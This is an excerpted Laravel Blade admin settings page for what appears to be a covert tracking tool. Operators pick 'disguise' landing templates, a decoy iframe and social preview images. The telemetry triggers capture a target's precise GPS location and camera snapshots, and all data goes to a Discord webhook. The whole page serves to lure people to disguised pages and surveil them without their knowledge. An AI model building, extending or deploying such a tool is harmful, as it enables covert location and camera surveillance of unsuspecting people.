...
<div class="space-y-8 max-w-5xl mx-auto">
    ...
    <!-- Header -->
    <div>
        <h1 class="text-2xl font-bold text-white tracking-tight">Configuration & Templates</h1>
        <p class="text-zinc-400 text-sm mt-1">Manage landing page templates, Discord Webhook integrations, disguise parameters, and telemetry triggers.</p>
    </div>

    <!-- Discord Integration Card -->
    <div class="p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-5">
        <div class="flex items-center justify-between border-b border-zinc-800 pb-4">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 rounded-xl bg-[#5865F2]/20 border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] text-xl">
                    <i class="fa-brands fa-discord"></i>
                </div>
                <div>
                    <h3 class="font-bold text-white text-base">Discord Webhook Integration</h3>
                    <p class="text-xs text-zinc-400">All telemetry data and target snapshots will be sent directly to your Discord channel.</p>
                </div>
            </div>

            <button type="button" onclick="testWebhook()" id="testWebhookBtn"
                    class="px-4 py-2 bg-[#5865F2] hover:bg-[#4752C4] text-white text-xs font-semibold rounded-xl shadow-lg shadow-[#5865F2]/20 transition flex items-center gap-1.5">
    ...
    <form action="{{ route('admin.settings.update') }}" method="POST" class="space-y-6">
        ...
        <div class="p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <div class="flex items-center justify-between border-b border-zinc-800 pb-3">
                <div>
                    ...
                    <p class="text-xs text-zinc-400 mt-0.5">Select which disguise template is served by default at root URL (<code>/</code>).</p>
                </div>
                <span class="text-[11px] text-zinc-500 font-mono">Each template is also accessible via <code>/p/{template-id}</code></span>
            </div>
                        ...
                        <div class="p-4 rounded-xl border bg-zinc-950/80 transition duration-200 peer-checked:border-pink-500 peer-checked:bg-pink-950/20 peer-checked:shadow-lg peer-checked:shadow-pink-500/10 border-zinc-800 hover:border-zinc-700 h-full flex flex-col justify-between">
                            <div>
                                <div class="flex items-center justify-between mb-3">
                                    <div class="w-9 h-9 rounded-lg bg-gradient-to-tr {{ $tpl['color'] }} flex items-center justify-center text-white text-sm shadow">
                                        <i class="fa-solid {{ $tpl['icon'] }}"></i>
                                    </div>
                                    <span class="px-2 py-0.5 text-[10px] font-semibold rounded-full bg-zinc-800 text-zinc-300">
                                        {{ $tpl['badge'] }}
                                    </span>
                                </div>
                            ...
                            <div class="pt-4 border-t border-zinc-800/80 mt-3 flex items-center justify-between text-[11px]">
                                <span class="text-zinc-500 font-mono">/p/{{ $id }}</span>
                                <a href="{{ route('landing.custom', $id) }}" target="_blank" onclick="event.stopPropagation();" class="text-pink-400 hover:text-pink-300 font-medium">
        ...
        <div class="p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-2">Webhook Credentials</h4>
            ...
            <div>
                ...
                <input type="url" id="discord_webhook_url" name="discord_webhook_url" 
                       ...
                       class="w-full px-4 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-sm text-white font-mono placeholder-zinc-600 focus:outline-none focus:border-pink-500">
                <p class="text-[11px] text-zinc-500 mt-1">Stored securely on the backend. Never exposed to target browsers or public scripts.</p>
            </div>
        ...
        <div class="p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-2">Disguise & Social Preview (Classic Template)</h4>
            ...
            <div>
                <label for="og_image_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Social Preview Image & Landing Image URL</label>
            ...
            <div>
                <label for="decoy_iframe_url" class="block text-xs font-medium text-zinc-300 mb-1.5">Decoy Iframe Embedded Website URL (Optional)</label>
        ...
        <div class="p-6 bg-zinc-900 rounded-2xl border border-zinc-800 shadow-xl space-y-4">
            <h4 class="text-xs uppercase font-mono tracking-wider text-pink-400 font-semibold mb-2">Telemetry Rules & Triggers</h4>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="p-4 bg-zinc-950 rounded-xl border border-zinc-800 flex items-center justify-between">
                    <div>
                        <div class="text-xs font-medium text-white">Capture GPS Location</div>
                        <div class="text-[11px] text-zinc-500">Request browser precise geolocation coordinates</div>
                    </div>
                    <select name="capture_gps_enabled" class="px-3 py-1.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white">
                ...
                <div class="p-4 bg-zinc-950 rounded-xl border border-zinc-800 flex items-center justify-between">
                    <div>
                        ...
                        <div class="text-[11px] text-zinc-500">Access target camera and capture snapshots</div>
                    </div>
                    <select name="capture_cam_enabled" class="px-3 py-1.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white">
        ...
        <div class="flex justify-end">
            <button type="submit" class="px-6 py-3 bg-pink-600 hover:bg-pink-500 text-white font-medium text-sm rounded-xl shadow-lg shadow-pink-600/30 transition">
                <i class="fa-solid fa-floppy-disk mr-1.5"></i> Save All Settings & Template
            </button>
        </div>
